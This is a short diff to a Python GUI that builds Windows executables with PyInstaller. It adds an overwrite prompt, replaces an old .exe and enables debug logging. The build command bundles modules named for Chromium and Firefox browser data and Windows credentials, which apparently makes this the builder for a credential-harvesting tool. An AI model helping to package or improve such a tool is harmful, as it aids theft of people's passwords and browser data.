@@ -454,6 +454,13 @@ class BuilderApp:
         if not os.path.isdir(out):
             messagebox.showerror("Dossier invalide", f"Le dossier de sortie est introuvable :\n{out}")
             return False
+            
+        # Vérifier si le fichier existe déjà
+        dest_file = Path(out) / f"{name}.exe"
+        if dest_file.exists():
+            if not messagebox.askyesno("Fichier existant", f"Le fichier {name}.exe existe deja dans le dossier de sortie.\nVoulez-vous l'ecraser ?"):
+                return False
+                
         return True
 
     # ── Lancement de la construction (dans un thread) ────────────────────
@@ -490,6 +497,8 @@ class BuilderApp:
                 exe = self._pyinstaller_build(tmp, script, name, icon_path)
 
                 dest = out_dir / f"{name}.exe"
+                if dest.exists():
+                    dest.unlink() # Supprimer l'ancien fichier s'il existe
                 shutil.move(str(exe), str(dest))
 
             self.root.after(0, self._on_build_success, str(dest))
@@ -569,6 +578,7 @@ class BuilderApp:
             "--hidden-import", "steelfox.modules.browsers.chromium",
             "--hidden-import", "steelfox.modules.browsers.firefox",
             "--hidden-import", "steelfox.modules.windows.credentials",
+            "--log-level", "DEBUG",                 # Pour avoir plus de détails en cas d'erreur
         ]
         if icon:
             cmd += ["--icon", icon]
